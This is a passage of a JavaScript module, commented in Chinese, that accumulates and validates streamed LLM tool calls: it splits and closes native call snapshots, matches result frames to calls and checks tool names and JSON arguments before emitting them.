        const extra = Object.keys(parsed).filter(key => !Object.prototype.hasOwnProperty.call(properties, key));
        if (extra.length) {
          warnTool(`原生工具调用 ${call.name} 带有 schema 未声明的键（${extra.join(', ')}），照常发射`);
        }
      }
    }
    call.emittable = true;
  };

  const closeCall = (call, reason) => {
    call.open = false;
    call.closeReason = reason;
    if (openCall === call) openCall = null;
    judgeNativeCall(call);
  };

  const pushNativeSnapshot = (frame) => {
    if (!frame || typeof frame !== 'object') return;
    const name = typeof frame.name === 'string' ? frame.name : '';
    const args = typeof frame.arguments === 'string' ? frame.arguments : '';
    const phase = typeof frame.phase === 'string' ? frame.phase : null;
    const functionId = typeof frame.functionId === 'string' && frame.functionId ? frame.functionId : null;

    let splits = false;
    if (openCall) {
      splits = !!(
        (functionId && openCall.functionId && functionId !== openCall.functionId) ||
        (name && openCall.name && name !== openCall.name) ||
        (isCompleteJson(openCall.arguments) && args !== openCall.arguments && !args.startsWith(openCall.arguments)) ||
        (args === '' && openCall.arguments !== '')
      );
    }

    if (!openCall || splits) {
      // 本轮已关闭调用的逐字节副本：重复帧，丢弃，不开新的，也不关旧的。空快照不算副本
      // （每个调用都以 '' 开头，它不是重复的证据）。
      if (args !== '' && nativeCalls.some(call => !call.open && call.name === name && call.arguments === args)) return;
      if (openCall) closeCall(openCall, 'split');
      openCall = {
        name, arguments: args, phase, functionId,
        open: true, closeReason: null, resultSeen: false, emittable: false, emitted: false
      };
      nativeCalls.push(openCall);
      return;
    }

    if (name && !openCall.name) openCall.name = name;
    if (phase) openCall.phase = phase;
    if (functionId && !openCall.functionId) openCall.functionId = functionId;
    if (args.length < openCall.arguments.length && !isCompleteJson(openCall.arguments)) {
      warnTool(`原生工具调用快照回退（snapshot_regression）：${openCall.name || '<unnamed>'} 收到更短且未配平的快照，保留较长的那份`);
      return;
    }
    openCall.arguments = args;
  };

  // 结果帧按调用顺序到达，且可能晚于分裂关闭（SendMessage 先被 Bash 的开始关闭，它的
  // 结果帧才来）：认领最早一个尚未被结果确认的同名**客户端**调用（FIFO）；它若还打开着
  // 就顺带关闭。平台调用不参与认领：客户端声明了与平台同名的工具（web_search）时，让
  // 平台调用抢走结果帧会使客户端调用永远到不了配平、早停点不起来；平台调用本来就靠
  // 分裂 / 边界 / 回合结束关闭，不需要结果帧。
  const closeByName = (name) => {
    if (typeof name !== 'string' || !name) return false;
    const pending = nativeCalls.find(call => isClientCall(call) && !call.resultSeen && call.name === name);
    if (!pending) return false;
    pending.resultSeen = true;
    if (pending.open) closeCall(pending, 'result');
    return true;
  };

  const closeOpen = (reason = 'boundary') => {
    if (!openCall) return false;
    closeCall(openCall, reason);
    return true;
  };

  const takeCompleted = () => {
    const out = [];
    for (const call of nativeCalls) {
      if (call.open || !call.emittable || call.emitted) continue;
      call.emitted = true;
      out.push(buildEmitted(call.name, call.arguments));
    }
    return out;
  };

  const batchState = () => {
    const client = nativeCalls.filter(isClientCall);
    return {
      opened: client.length,
      closedByResult: client.filter(call => call.resultSeen).length,
      gated: client.filter(call => call.emittable).length
    };
  };

  const push = (deltas) => {
    if (!Array.isArray(deltas)) return;
    for (const delta of deltas) {
      if (!delta || typeof delta !== 'object') continue;
      const index = Number.isInteger(delta.index) ? delta.index : calls.size;
      const current = calls.get(index) || {
        index,
        id: delta.id || null,
        type: delta.type || 'function',
        function: { name: '', arguments: '' }
      };
      if (delta.id) current.id = delta.id;
      if (delta.type) current.type = delta.type;
      if (typeof delta.function?.name === 'string' && delta.function.name) {
        const incomingName = delta.function.name;
        if (!current.function.name) {
          current.function.name = incomingName;
        } else if (incomingName === current.function.name || current.function.name.endsWith(incomingName)) {
          // 某些兼容上游会在每个 delta 重复完整 name，不能重复拼接。
        } else if (incomingName.startsWith(current.function.name)) {
          current.function.name = incomingName;
        } else {
          current.function.name += incomingName;
        }
      }
      if (typeof delta.function?.arguments === 'string') current.function.arguments += delta.function.arguments;
      calls.set(index, current);
    }
  };

  // 单发：旧消费者只调一次；再调返回 []，不重记错误（以前每次调用都重新 push 错误）。
  const finalize = () => {
    if (finalized) return [];
    finalized = true;
    const out = [];
    for (const [index, call] of [...calls.entries()].sort((a, b) => a[0] - b[0])) {
      if (!call.function.name) {
        errors.push({ type: 'missing_tool_name', index });
        continue;
      }
      if (allowedToolNames && !allowedToolNames.has(call.function.name)) {
        errors.push({ type: 'unknown_tool', name: call.function.name });
        continue;
      }
      try {
        JSON.parse(call.function.arguments || '{}');
      } catch (_) {
        errors.push({ type: 'invalid_arguments', name: call.function.name });
        continue;
      }
      const emitted = buildEmitted(call.function.name, call.function.arguments || '{}');
      if (call.id) emitted.id = call.id;
      out.push(emitted);
    }
    closeOpen('round_end');
    out.push(...takeCompleted());
    return out;
  };

  return {
    push,
    pushNativeSnapshot,
    closeByName,
    closeOpen,
    takeCompleted,
    finalize,
    batchState,
    hasOpenClientCalls: () => !!(openCall && isClientCall(openCall)),
    hasAny: () => calls.size > 0 || nativeCalls.length > 0,
    hasParseError: () => errors.length > 0,
    getErrors: () => [...errors]
  };
};

module.exports = {
  TOOL_CALL_OPEN,
  TOOL_CALL_CLOSE,
  TOOL_RESULT_OPEN,
  TOOL_RESULT_CLOSE,
  TOOL_CALL_PAYLOAD_WINDOW,
  buildToolSystemPrompt,
  foldToolMessages,
  parseToolCallsFromText,
  createToolCallStreamParser,
  createNativeToolCallAccumulator,
  looksLikeUnexecutedToolAction,
  containsOrphanProtocolResidue,
  // 单一来源的负载形状谓词与开端识别器：残渣检测、合成开端、测试共用同一份。
  isLeakedToolPayloadShape,
  matchToolCallOpening,
  normalizeAllowedToolNames,
  ANSWER_PHASES,
  serializeToolArguments,
  // 控制字符修复导出仅供测试钉住"合法 JSON 是不动点"的不变式。
  escapeRawControlCharsInStrings,
  // 交付层残渣剥离：文本减去解析器登记的被定罪 span（绝无第二套独立扫描）。
  stripToolCallResidue,
  // 引号修复导出仅供测试钉住确定性与"合法 JSON 是不动点"的不变式。
  repairLooseToolPayload,
  // 字符串内引号转义导出仅供测试钉住键/值感知规则与"合法 JSON 是不动点"的不变式。
  escapeInnerQuotesInStrings,
  // 正文之后的语义门导出仅供测试钉住"多余键放行、required 缺席拒绝"。
  gateAfterProsePayload
};
